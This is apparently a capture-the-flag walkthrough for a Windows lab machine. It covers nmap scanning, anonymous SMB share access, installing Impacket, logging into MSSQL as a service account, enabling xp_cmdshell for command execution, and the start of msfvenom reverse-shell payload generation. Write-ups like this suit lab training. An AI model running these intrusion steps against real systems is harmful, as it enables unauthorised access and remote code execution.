**NMAP Scan**

```sh
  nmap -sV -sC -p- 10.129.95.187
  ```

- To see the versions of the services running (**-sV**)
- To perform a script scan using the default set of scripts (**-sC**)
- To scan all ports from 1 through 65535 (**-p-**)


 Open Ports

* 135/tcp   open  msrpc        Microsoft Windows RPC
* 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
* 445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
* 1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.0
* 5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
* 47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
* 49664/tcp open  msrpc        Microsoft Windows RPC
* 49665/tcp open  msrpc        Microsoft Windows RPC
* 49666/tcp open  msrpc        Microsoft Windows RPC
* 49667/tcp open  msrpc        Microsoft Windows RPC
* 49668/tcp open  msrpc        Microsoft Windows RPC
* 49669/tcp open  msrpc        Microsoft Windows RPC

**SMB Client** to enumerate the SMB


```sh
  smbclient -N -L \\\\10.129.95.187\\
  ```

List of shares (**-L**)

No password (**-N**)

![image](https://user-images.githubusercontent.com/99097743/169720137-8d8b886d-3eb6-4862-b00f-76014203e263.png)

One of the sharenames does not have the dollar sign (**backups**) --> Non-Administrative share over SMB  


```sh
  smbclient -N //10.129.95.187/backups
  ```

**Impacket** to connect and authenticate to the MSSQL server

Impacket is a collection of Python classes for working with network protocols. Impacket packet includes **mssqlclient.py**  An MSSQL client, supporting SQL and Windows Authentications (hashes too). It also supports TLS. **It can be used in order to establish an authenticated connection to a Microsoft SQL Server**.


https://github.com/SecureAuthCorp/impacket

Impacket Installation Steps:
```sh
sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
sudo pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket
supo python3 ./setup.py install
```

The command to connect and authenticate to the MSSQL server:
```sh
mssqlclient.py ARCHETYPE/sql_svc:{Password}@10.129.95.187 -windows-auth
```

- Please make sure to **enable xp_cmdshell** and **reconfigure**
- Need to use **xp_cmdshell** before every comments
  - xp_cmdshell dir --> Shows directory
  - xp_cmdshell "powershell -c cd C:/; pwd" --> First changes dir to C:/ then shows pwd

**Generate Reverse Shell**

We can try **msfvenom** tool to generate the payload for the reverse shell. 

![image](https://user-images.githubusercontent.com/99097743/169732063-60f5b6b4-3640-4197-92d5-8c265a02d9c7.png)

```sh
msfvenom -l payloads 
```

